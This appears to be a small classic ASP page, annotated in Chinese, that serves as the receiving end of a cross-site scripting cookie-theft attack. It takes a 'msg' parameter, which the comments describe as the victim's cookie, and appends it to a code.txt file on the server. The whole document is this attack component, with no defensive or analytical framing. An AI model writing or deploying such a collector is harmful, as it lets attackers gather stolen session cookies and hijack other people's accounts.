<html>
<title>xx</title>
<body>
<%testfile = Server.MapPath("code.txt") //先构造一个路径，也就是取网站根目录，创造一个在根目录下的code.txt路径，保存在testfile中
msg = Request("msg")   //获取提交过来的msg变量，也就是cookie值
set fs = server.CreateObject("scripting.filesystemobject")//创建一个fs对象
set thisfile = fs.OpenTextFile(testfile,8,True,0)
thisfile.WriteLine(""&msg&"")//像code.txt中写入获取来的cookie
thisfile.close()   //关闭
set fs = nothing%>
</body>
</html>
